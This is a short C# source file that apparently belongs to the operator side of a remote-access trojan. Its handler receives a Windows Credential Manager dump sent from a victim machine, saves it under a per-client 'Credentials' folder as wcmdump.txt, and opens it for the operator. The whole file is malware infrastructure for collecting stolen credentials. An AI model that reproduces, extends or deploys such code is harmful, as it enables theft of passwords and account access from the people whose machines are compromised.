using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using Server.Helper;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;

namespace Server.Handle_Packet
{
    public class HandleWcmDump
    {
        public void AddToOutputList(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string tempPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("ID").AsString + "\\Credentials");
                string fullPath = tempPath + $"\\wcmdump.txt";
                if (!Directory.Exists(tempPath))
                    Directory.CreateDirectory(tempPath);
                File.WriteAllText(fullPath, unpack_msgpack.ForcePathObject("Output").AsString);
                Process.Start("explorer.exe", fullPath);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
    }
}
